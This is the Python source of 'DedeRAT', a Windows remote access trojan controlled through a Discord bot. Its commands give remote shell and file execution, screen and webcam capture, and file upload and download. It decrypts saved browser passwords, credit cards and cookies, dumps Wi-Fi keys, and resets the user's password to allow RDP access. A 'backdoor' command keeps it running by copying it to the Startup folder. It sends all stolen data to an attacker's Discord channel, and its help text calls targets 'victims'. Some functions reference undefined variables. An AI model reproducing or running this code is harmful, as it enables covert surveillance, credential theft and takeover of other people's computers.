import os
import shutil
import json
import sqlite3
import asyncio
from pynput.keyboard import Listener as KeyboardListener, Controller as KeyboardController
from pynput.mouse import Listener as MouseListener, Controller as MouseController
from datetime import datetime, timedelta
import base64
import discord
from discord.ext import commands
import sys
import platform
import pyautogui
import subprocess
import requests
import socket
import random
import time
import cv2
import pyaudio
import wave
import numpy as np
import asyncio
import pygetwindow as gw
from PIL import ImageGrab, Image
import ctypes
import argparse
import win32crypt
import webbrowser
import pygame
import pygame.camera
import tempfile
import winreg as reg 
 
intents = discord.Intents.all()

bot = commands.Bot(command_prefix="dede ", intents=intents)

user_profile = os.environ['USERPROFILE']
roaming_path = os.path.join(user_profile, 'AppData', 'Roaming')

serverid = 1234567890 #Channel ID

bottoken = "<BOT-TOKEN>"

sessionid = random.randint(10000,99999)

autorun = True


def get_hostname():
    try:
        hostname = socket.gethostname()
        return hostname
    except Exception as e:
        return f"Error getting hostname: {e}"

def get_ip_address():
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        return ip_address
    except Exception as e:
        return f"Error getting IP address: {e}"

# Example usage
hostname = get_hostname()
ip_address = get_ip_address()

def get_system_info():
    info = (
        f"**Python Version:** {sys.version}\n"
        f"**Platform:** {platform.system()}\n"
        f"**Platform Release:** {platform.release()}\n"
        f"**Platform Version:** {platform.version()}\n"
        f"**Architecture:** {platform.machine()}\n"
        f"**Hostname:** {platform.node()}\n"
        f"**IP Address:** {ip_address}\n"
        f"**Processor:** {platform.processor()}\n"
        f"**Number of CPUs:** {os.cpu_count()}\n"
        f"**OS Name:** {os.name}\n"
        f"**Current Directory:** {os.getcwd()}\n"
        f"**User:** {os.getlogin()}"
    )
    return info

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    channel = bot.get_channel(serverid)
    if channel:
        await channel.send(f':octagonal_sign: New Victim Connected | Session ID : {sessionid} | IP : {ip_address} | Hostname : {hostname}')
    else:
        print("Channel not found")

@bot.command(name='sysinfo')
async def sysinfo(ctx):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2:
        msg = parts[0]
        generated_sessionid = parts[1].strip()
        info = get_system_info()
        await ctx.send(info)
    else:
        await ctx.send(f"Invalid format.")

@bot.command(name='ss')
async def ss(ctx):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2:
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        await ctx.send(file=discord.File(screenshot_path))
        os.remove(screenshot_path)
    else:
        await ctx.send(f"Invalid format.")

@bot.command(name='shell')
async def shell(ctx, *, command=None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if command is None:
            await ctx.send("Shell command cannot be empty!")
        else:
            try:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                
                # Decode output with 'utf-8' and fall back to 'cp1252' if needed
                try:
                    stdout = stdout.decode('utf-8')
                    stderr = stderr.decode('utf-8')
                except UnicodeDecodeError:
                    stdout = stdout.decode('cp1252', errors='replace')
                    stderr = stderr.decode('cp1252', errors='replace')

                # Write to file with 'utf-8' encoding
                stouter_path = os.path.join(roaming_path, 'stout.txt')
                with open(stouter_path, 'w', encoding='utf-8') as stouter:
                    stouter.write(stdout)
                
                await ctx.send(file=discord.File(stouter_path))
                os.remove(stouter_path)
            except Exception as e:
                await ctx.send(f"An error occurred: {e}")
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command(name='cd')
async def cd(ctx, *, path=None):
    message_content = ctx.message.content
    parts = message_content.rsplit(f' si:{sessionid}', 1)
    if len(parts) == 2 and parts[1].strip() == '':
        path = parts[0].replace(f'{ctx.prefix}cd ', '').strip()
        if path == '':
            await ctx.send("Path cannot be empty!")
        else:
            try:
                os.chdir(path)
                await ctx.send(f"Changed directory to {path}")
            except FileNotFoundError:
                await ctx.send(f"Directory not found: {path}")
            except Exception as e:
                await ctx.send(f"An error occurred: {e}")
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command()
async def ls(ctx):
    directory = '.'  # You can specify any directory here

    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2:
        try:
            # Get all files and directories in the specified directory
            files_and_dirs = os.listdir(directory)
            
            # Prepare lists for files and directories
            files = [f for f in files_and_dirs if os.path.isfile(os.path.join(directory, f))]
            dirs = [d for d in files_and_dirs if os.path.isdir(os.path.join(directory, d))]
            
            # Combine files and directories into one list
            all_items = files + dirs
            
            if all_items:
                item_list = '\n'.join(all_items)  # Join the list into a single string
                await ctx.send(f"Files and directories in the directory:\n{item_list}")
            else:
                await ctx.send("No files or directories found in the directory.")
                
        except Exception as e:
            await ctx.send(f"An error occurred: {str(e)}")
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command(name='stealrdp')
async def stealrdp(ctx):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2:
        hostname = socket.gethostname()
        rdpip = requests.get('https://api.ipify.org').text
        rdppassrandint = random.randint(1000000, 9999999)
        rdppassw = f"{rdppassrandint}!!"
        os.system(f'net user %username% {passw}')
        await ctx.send(f'\nUsername : {hostname}\nIP Address : {ip}\nPassword : {passw}')
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command(name='record')
async def record(ctx, seconds: int):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if seconds <= 0:
            await ctx.send("The duration must be a positive integer.")
            return

        await ctx.send(f"Recording for {seconds} seconds...")

        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter("output.avi", fourcc, 5.0, (1366, 768))

        start_time = time.time()
        while time.time() - start_time < seconds:
            img = ImageGrab.grab()
            img_np = np.array(img)
            frame = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
            out.write(frame)

        out.release()
        cv2.destroyAllWindows()

        time.sleep(1)

        await ctx.send(file=discord.File("output.avi"))

        os.remove("output.avi")
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command()
async def download(ctx, *, path=None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if path==None:
            await ctx.send("Path cannot be empty!")
        else:
            await ctx.send(f"File at {path} sending...")
            await ctx.send(file=discord.File(path))
    else:
        await ctx.send("Invalid session ID or command format.")


@bot.command()
async def upload(ctx, *, path=None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if path is None:
            await ctx.send("Path cannot be empty!")
            return
        
        if len(ctx.message.attachments) == 0:
            await ctx.send("Please upload a file.")
            return
        
        attachment = ctx.message.attachments[0]
        
        directory = os.path.dirname(path)
        
        if not os.path.exists(directory):
            os.makedirs(directory)
        
        save_path = os.path.join(directory, attachment.filename)
        
        await attachment.save(save_path)
        await ctx.send(f"File uploaded to {save_path} successfully!")
    else:
        await ctx.send("Invalid session ID or command format.")

def set_wallpaper(image_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

@bot.command()
async def setbg(ctx):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if len(ctx.message.attachments) == 0:
            await ctx.send("Please attach an image file.")
            return

        attachment = ctx.message.attachments[0]
        
        # Geçici dosya yolu
        temp_image_path = os.path.join(os.getcwd(), 'temp_image.jpg')

        # Dosyayı indirin ve kaydedin
        await attachment.save(temp_image_path)

        # Resmi doğrula
        try:
            img = Image.open(temp_image_path)
            img.verify()  # Dosyanın geçerli bir resim olup olmadığını kontrol et
        except (IOError, SyntaxError) as e:
            await ctx.send("Invalid image file.")
            os.remove(temp_image_path)
            return

        # Masaüstü arka planını değiştir
        set_wallpaper(temp_image_path)
        await ctx.send(f"Wallpaper changed to {temp_image_path}.")

        # Geçici dosyayı temizle
        os.remove(temp_image_path)
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command()
async def msgbox(ctx, *, args: str):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        parser = argparse.ArgumentParser()
        parser.add_argument('-msg', type=str, required=True, help='Message')
        parser.add_argument('-ttl', type=str, required=True, help='Title')
        parsed_args = parser.parse_args(args.split())
        titlemsgbox = parsed_args.ttl
        messagemsgbox = parsed_args.msg
        pyautogui.alert(text=messagemsgbox, title=titlemsgbox)

        keyboard = KeyboardController()
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command()
async def capsrandtroll(ctx, seconds: int = None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if seconds is None:
            await ctx.send("Please enter seconds value")
            return

        start_time = time.time()
        while time.time() - start_time < seconds:
            # Simulate the Shift key being pressed
            with keyboard.pressed(Key.shift):
                # Wait for a random float time between 2 and 5 seconds
                await asyncio.sleep(random.uniform(0.2, 0.5))
            
            # Wait for a random float time between 2 and 3 seconds
            await asyncio.sleep(random.uniform(0.2, 0.5))
        
        await ctx.send(f"Completed trolling for {seconds} seconds.")
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command()
async def visitsite(ctx, website=None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if website==None:
            await ctx.send("Please enter website!")
        else:
            webbrowser.open_new(website)
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command()
async def shutdown(ctx):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        os.system('shutdown -s -t 0')
        await ctx.send("PC shutdowned successfuly!")
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command(name='tasklist')
async def tasklist(ctx):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        try:
            process = subprocess.Popen("tasklist", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()
            
            try:
                stdout = stdout.decode('utf-8')
                stderr = stderr.decode('utf-8')
            except UnicodeDecodeError:
                stdout = stdout.decode('cp1252', errors='replace')
                stderr = stderr.decode('cp1252', errors='replace')

            stouter_path = os.path.join(roaming_path, 'stout.txt')
            with open(stouter_path, 'w', encoding='utf-8') as stouter:
                stouter.write(stdout)
                
            await ctx.send(file=discord.File(stouter_path))
            os.remove(stouter_path)
            
        except Exception as e:
            await ctx.send(f"An error occurred: {e}")
    else:
        await ctx.send("Invalid session ID or command format.")


@bot.command(name='taskkill')
async def taskkill(ctx, pid=None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if pid is None:
            await ctx.send("Please enter a PID!")
        else:
            try:
                process = subprocess.Popen(f"taskkill /PID {pid}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                await ctx.send(f"{pid} killed successfuly!")
            except Exception as e:
                await ctx.send(f"An error occurred: {e}")
    else:
        await ctx.send("Invalid session ID or command format.")


@bot.command(name='write')
async def write(ctx, *, sentence=None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if sentence == None:
            await ctx.send("Please write a sentence!")
        else:
            pyautogui.write(sentence)
            await ctx.send(f"{sentence} writed successfuly!")
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command(name='pwd')
async def pwd(ctx):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        await ctx.send(os.getcwd())
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command(name='moveto')
async def moveto(ctx, x: int=None, y: int=None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if x is None or y is None:
            await ctx.send("Usage : moveto 100 200 (moveto x y)")
        else:
            pyautogui.moveTo(x, y)
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command(name='delet')
async def delet(ctx, path=None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if path is None:
            await ctx.send("Please enter a path")
        else:
            os.remove(path)
            await ctx.send("File deleted successfuly")
    else:
        await ctx.send("Invalid session ID or command format.")

def list_ports():
    """
    Test the ports and returns a tuple with the available ports 
    and the ones that are working.
    """
    is_working = True
    dev_port = 0
    working_ports = []
    available_ports = []
    while is_working:
        camera = cv2.VideoCapture(dev_port)
        if not camera.isOpened():
            is_working = False
            print("Port %s is not working." %dev_port)
        else:
            is_reading, img = camera.read()
            w = camera.get(3)
            h = camera.get(4)
            if is_reading:
                print("Port %s is working and reads images (%s x %s)" %(dev_port,h,w))
                working_ports.append(dev_port)
            else:
                print("Port %s for camera ( %s x %s) is present but does not reads." %(dev_port,h,w))
                available_ports.append(dev_port)
        dev_port +=1
    return available_ports,working_ports

@bot.command(name='webcamlist')
async def webcamlist(ctx, path=None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        await ctx.send(list_ports())
    else:
        await ctx.send("Invalid session ID or command format.")


# Define paths for browsers
appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

# Decrypts stored passwords
def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

# Get master key for decryption
def get_master_key(path: str):
    if not os.path.exists(path):
        return None

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return None

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

# Save results to file
def save_results(browser_name, type_of_data, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
    if content:
        with open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8") as file:
            file.write(content)
        print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
    else:
        print(f"\t [-] No Data Found!")

# Get data from database
def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return ""
    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
    except:
        print(f"Can't access file {type_of_data['file']}")
        return result
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes) and row[i]:
                    row[i] = decrypt_password(row[i], key)
        if type_of_data['decrypt'] and 'history' in type_of_data['query']:
            if isinstance(row[2], (int, float)) and row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result

# Convert Chrome time format
def convert_chrome_time(chrome_time):
    try:
        chrome_time = int(chrome_time)  # Ensure it's an integer
        return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
    except ValueError:
        return "Invalid date"


# Check for installed browsers
def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x] + "\\Local State"):
            available.append(x)
    return available

@bot.command(name='grab')
async def grab(ctx):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        available_browsers = installed_browsers()
        if not available_browsers:
            await ctx.send("No browsers found.")
            return
        
        results = ""
        for browser in available_browsers:
            browser_path = browsers[browser]
            master_key = get_master_key(browser_path)
            if not master_key:
                await ctx.send(f"Could not retrieve master key for {browser}.")
                continue
            
            for data_type_name, data_type in data_queries.items():
                profile = "Default"
                notdefault = ['opera-gx']
                if browser in notdefault:
                    profile = ""
                data = get_data(browser_path, profile, master_key, data_type)
                if data:
                    results += f"**{browser} - {data_type_name.replace('_', ' ').capitalize()}**:\n{data}\n\n"
        
        if results:
            # Save results to a text file
            file_path = 'results.txt'
            with open(file_path, 'w', encoding='utf-8') as file:
                file.write(results)
            
            # Send the file to Discord
            with open(file_path, 'rb') as file:
                await ctx.send(file=discord.File(file, filename='results.txt'))
            
            # Remove the file after sending
            os.remove(file_path)
        else:
            await ctx.send("No data found.")
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command(name='cameraphoto')
async def cameraphoto(ctx, path=None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        width, height = 640, 380

        cap = cv2.VideoCapture(0)  # 0 corresponds to the default camera (usually the built-in webcam)

        if not cap.isOpened():
            await ctx.send("Error: Could not open camera.")
            return

        cap.set(3, width)  # Width
        cap.set(4, height)  # Height

        ret, frame = cap.read()

        if not ret:
            await ctx.send("Error: Could not capture a photo.")
            cap.release()
            return

        photo_filename = path if path else "neu.jpg"
        cv2.imwrite(photo_filename, frame)
        cap.release()

        # Sending the photo to the Discord channel
        try:
            with open(photo_filename, 'rb') as f:
                picture = discord.File(f)
                await ctx.send(file=picture)
        except Exception as e:
            await ctx.send(f"Error: {e}")
        finally:
            if os.path.exists(photo_filename):
                os.remove(photo_filename)
    else:
        await ctx.send("Invalid session ID or command format.")
    username=os.getlogin()
    docs=fr"C:\Users\{username}\Documents"
    

def addtostartup(destination_path):
    if getattr(sys, 'frozen', False):
        current_file = os.path.abspath(sys.executable)
    else:
        current_file = os.path.abspath(sys.argv[0])
    
    if not os.path.exists(destination_path):
        os.makedirs(destination_path)
    
    file_name = os.path.basename(current_file)
    
    destination_file = os.path.join(destination_path, file_name)
    
    shutil.copy2(current_file, destination_file)

    path = os.path.join(destination_path, "runmsedge.cmd")

    content = fr".\{file_name}"
    with open(path, 'w') as file:
        file.write(content)


username = os.environ['USERNAME']
destination_path = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    
def copy_to_startup():
    # Çalıştırılan dosyanın yolunu al
    if getattr(sys, 'frozen', False):
        # Eğer PyInstaller ile paketlenmişse, dosya yolunu al
        script_path = sys.executable
    else:
        # Eğer normal bir Python dosyasıysa, __file__ kullan
        script_path = os.path.abspath(__file__)
    
    # Başlangıç klasörünün yolu
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    
    # Hedef dosyanın tam yolu
    target_path = os.path.join(startup_folder, os.path.basename(script_path))
    
    # Dosyanın mevcut olup olmadığını kontrol et
    if os.path.exists(script_path):
        # Dosyayı kopyala
        shutil.copy(script_path, target_path)
        print(f"Dosya {target_path} yoluna kopyalandı.")
    else:
        print(f"Dosya {script_path} bulunamadı.")

@bot.command(name='backdoor')
async def backdoor(ctx):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        copy_to_startup()
        await ctx.send("Backdoored!")
    else:
        await ctx.send("Invalid session ID or command format.")



@bot.command(name='recordvideo')
async def recordvideo(ctx, seconds: float):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        width, height = 640, 380
        fps = 30  # Frames per second

        cap = cv2.VideoCapture(0)  # 0 corresponds to the default camera (usually the built-in webcam)

        if not cap.isOpened():
            await ctx.send("Error: Could not open camera.")
            return

        cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
        cap.set(cv2.CAP_PROP_FPS, fps)

        # Use a temporary file for the video with .avi extension
        with tempfile.NamedTemporaryFile(suffix=".avi", delete=False) as temp_video_file:
            video_filename = temp_video_file.name

        fourcc = cv2.VideoWriter_fourcc(*'XVID')  # Codec for .avi files
        out = cv2.VideoWriter(video_filename, fourcc, fps, (width, height))

        end_time = cv2.getTickCount() + (seconds * cv2.getTickFrequency())

        while cv2.getTickCount() < end_time:
            ret, frame = cap.read()
            if not ret:
                await ctx.send("Error: Could not read frame from camera.")
                cap.release()
                out.release()
                os.remove(video_filename)
                return

            out.write(frame)
            await asyncio.sleep(0.01)  # Sleep briefly to avoid blocking other bot activities

        cap.release()
        out.release()

        # Sending the video to the Discord channel
        try:
            with open(video_filename, 'rb') as f:
                video = discord.File(f)
                await ctx.send(file=video)
        except Exception as e:
            await ctx.send(f"Error: {e}")
        finally:
            if os.path.exists(video_filename):
                os.remove(video_filename)
    else:
        await ctx.send("Invalid session ID or command format.")

@bot.command()
async def execute(ctx, path=None):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        if path is None:
            await ctx.send("Please enter a path")
        else:
            os.system(path)
            await ctx.send(path + " executed successfuly!")
    else:
        await ctx.send("Invalid session ID or command format.")

system_information = "Informations.txt"
file_path = os.getcwd()

@bot.command()
async def wifipasswords(ctx):
    message_content = ctx.message.content
    parts = message_content.split(f' si:{sessionid}')
    if len(parts) == 2 and parts[1].strip() == '':
        try:
            # Bilgi toplama
            output = subprocess.check_output("netsh wlan show profile", shell=True).decode()
            
            with open(file_path + "\\" + system_information, "w") as f:
                f.write("All of Registered Connections\n")
                f.write("==================================\n")
            
            # Profilleri yazma
            for line in output.splitlines():
                if "Profile" in line:
                    profile_name = line.split(":")[1].strip()
                    
                    # Wifi şifresini alma
                    wifi_output = subprocess.check_output(f'netsh wlan show profile "{profile_name}" key=clear', shell=True).decode()
                    key_content = None
                    
                    for wifi_line in wifi_output.splitlines():
                        if "Key Content" in wifi_line:
                            key_content = wifi_line.split(":")[1].strip()
                            break
                    
                    # Profil bilgilerini dosyaya yazma
                    with open(file_path + "\\" + system_information, "a") as f:
                        f.write(f"Profile: {profile_name}\n")
                        if key_content:
                            f.write(f"Password: {key_content}\n")
                        else:
                            f.write("Password: Not found\n")
                        f.write("\n")
                        
        except subprocess.CalledProcessError as e:
            await ctx.send(f"Error while fetching WiFi passwords: {e}")
            return
        
        # Dosyayı Discord'a gönderme
        await ctx.send(file=discord.File(file_path + "\\" + system_information))
        
        # Dosyayı temizleme
        os.remove(file_path + "\\" + system_information)
    else:
        await ctx.send("Invalid session ID or command format.")


@bot.command()
async def helpme(ctx):
    helpembed = discord.Embed(title="DedeRAT Commands", color=discord.Colour.red())
    helpembed.set_thumbnail(url="https://i.hizliresim.com/7co62f9.jpg")
    helpembed.add_field(name="cd", value=r"You can change directory! Usage : cd C:\\full\path\of\directory", inline=True)
    helpembed.add_field(name="pwd", value=r"See which directory in you are.", inline=False)
    helpembed.add_field(name="delet", value=r"Remove a file.", inline=False)
    helpembed.add_field(name="download", value=r"Did you like any file in victims computer? Let's get it! Usage : download C:\\full\path\of\directory", inline=False)
    helpembed.add_field(name="msgbox", value="Lets troll a little bit victim :> Usage : msgbox -msg Message -ttl Title", inline=False)
    helpembed.add_field(name="record", value="You can watch for a time! Usage : record 10 (i mean seconds as 10)", inline=False)
    helpembed.add_field(name="setbg", value="Just upload a photo and surprise the victim", inline=False)
    helpembed.add_field(name="shell", value="Execute CMD commands! Usage : shell dir", inline=False)
    helpembed.add_field(name="ss", value="Selfie!", inline=False)
    helpembed.add_field(name="stealrdp", value="Somebody opened your virus in RDP? Lets get a revenge!", inline=False)
    helpembed.add_field(name="sysinfo", value="Wanna read something long? Lets read system info.", inline=False)
    helpembed.add_field(name="upload", value=r"Give a gift to victim! Usage : upload C:\\full\path\of\your\wish (and attach a file)", inline=False)
    helpembed.add_field(name="capsrandtroll", value="iTs sEeMs lİkE tHaT! Usage : capsrandtroll 10 (seconds i mean)", inline=False)
    helpembed.add_field(name="visitsite", value="Travel!", inline=False)
    helpembed.add_field(name="shutdown", value="Maybe your victim trying downloading GTA V and it was %99 haha :>")
    helpembed.add_field(name="tasklist", value="Lets see which programs is open in your victim's PC", inline=False)
    helpembed.add_field(name="taskkill", value="You can close a program or game in your victim's PC :>", inline=False)
    helpembed.add_field(name="write", value="Write a sentence in your victim's PC", inline=False)
    helpembed.add_field(name="moveto", value="Move victim's mouse! Usage : moveto 100, 300 (moveto x y)", inline=False)
    helpembed.add_field(name="webcamlist", value="See the list of webcam", inline=False)
    helpembed.add_field(name="cameraphoto", value="Selfie again!", inline=False)
    helpembed.add_field(name="execute", value="Execute a file! Usage : execute <path>", inline=False)
    helpembed.add_field(name="recordvideo", value="Watch much your wish! Usage : recordvideo 10.0 (yeah i forgot it as float)", inline=False)
    helpembed.add_field(name="wifipasswords", value="See the wifis and passwords of victim connected once!", inline=False)
    helpembed.add_field(name="grab", value="Grab victim's passwords!", inline=False)

    await ctx.send(embed=helpembed)

bot.run(bottoken)
